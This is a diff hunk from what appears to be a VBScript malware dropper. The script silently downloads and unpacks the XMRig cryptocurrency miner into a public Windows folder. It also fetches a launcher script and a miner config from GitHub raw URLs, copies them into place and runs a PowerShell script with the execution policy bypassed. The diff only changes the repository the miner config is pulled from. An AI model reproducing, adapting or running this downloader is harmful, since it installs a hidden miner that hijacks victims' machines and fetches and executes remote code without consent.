@@ -22,7 +22,7 @@ objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://github.com/
 objShell.Run "powershell.exe -Command Expand-Archive -Path 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' -DestinationPath 'C:\Users\Public\Downloads\' -Force", 0, True
 WScript.Sleep 2000
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/COINRUN.cmd -OutFile C:\Users\Public\Downloads\COINRUN.cmd", 0, True
-objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
+objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/RVN/refs/heads/main/config.json -OutFile C:\Users\Public\Downloads\config.json", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\COINRUN.cmd -Destination C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd -Force", 0, True
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
